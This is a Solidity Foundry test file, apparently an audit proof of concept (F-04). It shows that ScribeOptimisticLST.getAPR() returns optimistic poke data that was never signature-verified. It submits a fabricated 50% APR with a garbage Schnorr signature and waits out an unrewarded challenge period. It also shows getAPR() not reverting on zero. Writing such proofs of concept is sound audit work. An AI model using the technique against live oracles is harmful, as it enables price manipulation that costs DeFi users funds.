// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {console2} from "forge-std/console2.sol";

import {IScribe} from "src/IScribe.sol";
import {IScribeOptimistic} from "src/IScribeOptimistic.sol";
import {ScribeOptimisticLST} from "src/extensions/ScribeOptimisticLST.sol";

import {LibSecp256k1} from "src/libs/LibSecp256k1.sol";
import {LibFeed} from "script/libs/LibFeed.sol";

import {IToll} from "chronicle-std/toll/IToll.sol";

import {Test} from "forge-std/Test.sol";

/// @title PoC: F-04 ScribeOptimisticLST.getAPR() returns unverified optimistic data
/// @notice Demonstrates that getAPR() returns opPokeData that was never Schnorr-verified,
///         and does NOT revert on val=0.
contract POC_F04 is Test {
    using LibSecp256k1 for LibSecp256k1.Point;
    using LibFeed for LibFeed.Feed;
    using LibFeed for LibFeed.Feed[];

    ScribeOptimisticLST private lstOracle;
    LibFeed.Feed[] private feeds;

    function setUp() public {
        lstOracle = new ScribeOptimisticLST(address(this), "stETH/USD");
        IToll(address(lstOracle)).kiss(address(this));
        feeds = _liftFeeds(lstOracle.bar());
    }

    function test_getAPR_returns_unverified_optimistic_data() public {
        // Step 1: Initial poke with verified Schnorr sig
        uint128 val1 = 3_500_000_000_000_000_000; // 3.5% APR
        IScribe.PokeData memory pokeData1;
        pokeData1.val = val1;
        pokeData1.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr1 =
            feeds.signSchnorr(lstOracle.constructPokeMessage(pokeData1));
        lstOracle.poke(pokeData1, schnorr1);

        uint apr = lstOracle.getAPR();
        assertEq(apr, val1);
        console2.log("Step 1: Initial verified APR =", apr);

        // Advance time so opPoke is not stale
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);

        // Step 2: Submit opPoke with fabricated APR (50%)
        uint128 fabricatedAPR = 50_000_000_000_000_000_000;
        IScribe.PokeData memory pokeData2;
        pokeData2.val = fabricatedAPR;
        pokeData2.age = uint32(block.timestamp);

        // Invalid Schnorr (garbage)
        IScribe.SchnorrData memory fakeSchnorr = IScribe.SchnorrData({
            signature: bytes32(uint(0xcafebabe)),
            commitment: address(0x2),
            feedIds: abi.encodePacked(feeds[0].id)
        });

        IScribe.ECDSAData memory ecdsaData =
            feeds[0].signECDSA(lstOracle.constructOpPokeMessage(pokeData2, fakeSchnorr));

        lstOracle.opPoke(pokeData2, fakeSchnorr, ecdsaData);
        console2.log("Step 2: opPoke with fabricated APR =", fabricatedAPR);

        // Step 3: No incentive to challenge (0 balance)
        assertEq(lstOracle.challengeReward(), 0);

        // Step 4: Warp past challenge period
        vm.warp(block.timestamp + lstOracle.opChallengePeriod() + 1);

        // Step 5: getAPR() returns the fabricated, unverified value
        uint aprAfter = lstOracle.getAPR();
        assertEq(aprAfter, fabricatedAPR);
        console2.log("Step 5: getAPR() returns fabricated APR =", aprAfter);
        console2.log("PASS: getAPR() returns unverified optimistic data");
    }

    function test_getAPR_does_not_revert_on_zero_val() public {
        // Demonstrate that getAPR() does NOT revert on val=0
        // (unlike read() which does require(val != 0))

        // No poke has been done, so _currentPokeData().val = 0
        // getAPR() should return 0 without reverting
        uint apr = lstOracle.getAPR();
        assertEq(apr, 0);
        console2.log("getAPR() with no data returns:", apr, "(no revert)");

        // Compare: read() would revert with require(val != 0)
        vm.expectRevert();
        lstOracle.read();
        console2.log("read() reverts on zero val (as expected)");

        console2.log("PASS: getAPR() does not revert on zero val unlike read()");
    }

    function _liftFeeds(uint8 numberFeeds)
        internal
        returns (LibFeed.Feed[] memory)
    {
        LibFeed.Feed[] memory feeds_ = new LibFeed.Feed[](uint(numberFeeds));
        uint privKey = 2;
        uint bloom;
        uint ctr;
        while (ctr != numberFeeds) {
            LibFeed.Feed memory feed = LibFeed.newFeed({privKey: privKey});
            if (bloom & (1 << feed.id) == 0) {
                bloom |= 1 << feed.id;
                feeds_[ctr++] = feed;
                lstOracle.lift(
                    feed.pubKey,
                    feed.signECDSA(lstOracle.feedRegistrationMessage())
                );
            }
            privKey++;
        }
        return feeds_;
    }
}
